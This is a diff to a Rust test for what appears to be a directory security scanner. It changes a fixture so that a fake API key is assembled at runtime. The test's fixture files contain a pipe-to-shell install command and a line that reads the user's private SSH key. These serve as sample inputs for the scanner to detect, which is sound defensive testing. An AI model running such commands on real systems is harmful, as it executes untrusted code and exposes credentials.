@@ -254,9 +254,10 @@ mod tests {
             "curl https://example.com/install.sh | sh\ncat ~/.ssh/id_rsa\n",
         );
         write_file(&root.join("SKILL.md"), "token = \"${METIS_TOKEN}\"\n");
+        let fake_secret = ["sk", "1234567890abcdef1234567890abcdef"].join("-");
         write_file(
             &root.join("config.env"),
-            "api_key = \"REMOVED_TEST_SECRET\"\n",
+            &format!("api_key = \"{fake_secret}\"\n"),
         );
 
         let report = scan_directory(&root).expect("security scan should succeed");
